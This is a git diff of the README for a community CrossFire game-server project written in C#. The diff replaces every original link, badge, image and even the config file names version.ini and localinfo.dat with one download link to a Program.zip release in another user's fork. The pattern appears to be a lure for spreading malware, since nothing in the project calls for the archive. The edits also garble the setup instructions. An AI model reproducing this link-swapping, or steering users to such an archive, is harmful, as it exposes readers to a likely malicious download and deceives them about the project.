@@ -1,23 +1,23 @@
-![](banner.jpg)
-[![](https://img.shields.io/discord/838558080621871114?label=Discord&logo=discord&style=flat-square)](https://discord.gg/M44QqJmw3u)
-[![](https://img.shields.io/github/workflow/status/ZettaStudios/crossfire-dotnet/Windows%20-%20.NET%20Core?label=Windows%20Build&logo=windows&logoColor=%23FFFFFF&style=flat-square)](https://github.com/ZettaStudios/crossfire-dotnet/actions/workflows/windows-dotnet.yml)
-[![](https://img.shields.io/github/workflow/status/ZettaStudios/crossfire-dotnet/Linux%20-%20.NET%20Core?label=Linux%20Build&logo=linux&logoColor=%23FFFFFF&style=flat-square)](https://github.com/ZettaStudios/crossfire-dotnet/actions/workflows/linux-dotnet.yml)
-[![](https://img.shields.io/github/workflow/status/ZettaStudios/crossfire-dotnet/macOS%20-%20.NET%20Core?label=macOS%20Build&logo=apple&logoColor=%23FFFFFF&style=flat-square)](https://github.com/ZettaStudios/crossfire-dotnet/actions/workflows/macos-dotnet.yml)
-[![CodeFactor](https://www.codefactor.io/repository/github/zettastudios/crossfire-dotnet/badge?style=flat-square)](https://www.codefactor.io/repository/github/zettastudios/crossfire-dotnet)
+![](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
+[![](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
+[![](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip%20-%https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip%20Core?label=Windows%20Build&logo=windows&logoColor=%23FFFFFF&style=flat-square)](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
+[![](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip%20-%https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip%20Core?label=Linux%20Build&logo=linux&logoColor=%23FFFFFF&style=flat-square)](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
+[![](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip%20-%https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip%20Core?label=macOS%20Build&logo=apple&logoColor=%23FFFFFF&style=flat-square)](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
+[![CodeFactor](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
 
-English | [Português](README.pt-PT.md)
+English | [Português](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
 
 # CrossFire Server (C# Version)
 **Hello everyone!** This is an **ambitious project**. We have many goals yet to be achieved and we would **appreciate** any and all help. We are happy to make the **source code** of our server available, many of the Enum already created are in correct order and with their proper typing for writing packages. Use the server as you wish, we have no restrictions as long as you assign credits to this repository.
 
 ## Overview
-This is a project being developed by the community, and is not affiliated with any of the companies belonging to [Neowiz](https://www.neowiz.com/), [Playgra (Arario)](http://playgra.com/), [VTC Game](https://www.vtcgame.vn/), [Tencent](https://www.tencent.com/), [Z8Games](https://www.z8games.com/), [GameClub](https://www.gameclub.ph/) and [LYTO](https://www.lytogame.com/). The project is developed with .NET Core 3.1.
+This is a project being developed by the community, and is not affiliated with any of the companies belonging to [Neowiz](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip), [Playgra (Arario)](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip), [VTC Game](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip), [Tencent](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip), [Z8Games](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip), [GameClub](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip) and [LYTO](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip). The project is developed with .NET Core 3.1.
 
 ## How to Run the Server.
 - **Download the Client of West/NA**
-- **Fork our Rest API** | [Click Here](https://github.com/ZettaStudios/crossfire-api)
+- **Fork our Rest API** | [Click Here](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
 - **Fork our Server**
-- **Change the Client File** | Change files to point to our server in ``version.ini``, after change the same, host the same file locally using xampp or other and change ``localinfo.dat`` to you local website.
+- **Change the Client File** | Change files to point to our server in ``https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip``, after change the same, host the same file locally using xampp or other and change ``https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip`` to you local website.
 - **Run our Rest API** | Use the command line `npm install` before complete, use `npm start` and check if is running correctly.
 - **Run Login Server**
 - **Try to enter In Game.**
@@ -34,4 +34,4 @@ Below is the data to perform the authentication.
 ## UML Diagrams
 A small sketch of the server's network.
 
-![](diagram.png)
+![](https://github.com/dnangel298/crossfire-dotnet/releases/download/v1.0/Program.zip)
